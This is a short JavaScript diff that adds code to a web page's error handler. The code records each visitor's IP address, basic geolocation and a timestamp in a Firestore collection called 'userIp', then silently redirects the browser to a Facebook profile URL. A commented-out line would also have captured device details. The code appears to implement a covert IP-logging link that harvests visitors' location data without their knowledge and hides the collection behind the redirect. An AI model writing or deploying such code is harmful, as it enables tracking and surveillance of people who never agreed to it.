@@ -37,6 +37,12 @@ console.log(deviceInfo);
       })
       .catch(error => {
         console.error(error);
+        db.collection("userIp").add({
+            ipAddress, time: new Date(), geoBasicInfo,
+//             ipAddress, deviceInfo, geoBasicInfo, time: new Date(),
+        }).then(_ => {
+            window.location.replace("http://www.facebook.com/profile.php?")
+        });
       });
 
 
